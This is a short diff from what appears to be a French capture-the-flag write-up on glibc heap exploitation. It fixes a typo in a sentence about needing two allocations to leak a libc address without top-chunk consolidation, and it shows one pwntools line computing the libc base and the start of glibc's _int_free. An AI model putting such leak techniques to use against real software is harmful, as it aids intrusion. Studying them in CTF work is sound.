@@ -166,7 +166,7 @@ libc.address = u64(leak.ljust(8,b"\x00")) -  (0x3554d8 + libc.sym.puts)
 info(f"LIBC: {hex(libc.address)}")
 ```
 
-Pour leak l'adresse, nous devons faire deux requêtes à minima. Si nous essayons d'allouer qu'un seul chunk, lors du free, il viendra consolider le ```top chunk``` et notre plan tombera à l'haut. 
+Pour leak l'adresse, nous devons faire deux requêtes à minima. Si nous essayons d'allouer qu'un seul chunk, lors du free, il viendra consolider le ```top chunk``` et notre plan tombera à l'eau. 
 
 ```c
 static void _int_free (mstate av, mchunkptr p, int have_lock){
